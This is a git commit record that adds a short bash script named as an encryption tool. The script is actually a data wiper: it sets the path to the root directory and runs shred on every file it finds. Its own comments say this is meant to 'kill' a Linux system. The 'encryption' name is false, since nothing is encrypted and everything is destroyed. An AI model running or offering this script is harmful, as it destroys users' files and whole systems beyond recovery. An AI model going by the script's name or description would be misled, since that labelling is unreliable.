15b482cddb76ea1bd16ac16f896f751ca56371b7
Cyber-Demon <103848881+Demon105856e@users.noreply.github.com>
2023-11-17 20:46:30 +0530

    Add files via upload

---
+++ encrpyion.sh
@@ -0,0 +1,12 @@
+#!/bin/bash
+#note :- handle it with care it could kill your linux
+#Created by "Devam Raval (DEMON)"
+#i have set / as the path so that it would kill the linux if you want to do encryption of any files in a perticular directory you could just write that as path
+
+path="/" 
+
+find "$path" -type f | while read -r normal_file
+do
+    shred $normal_file
+done
+
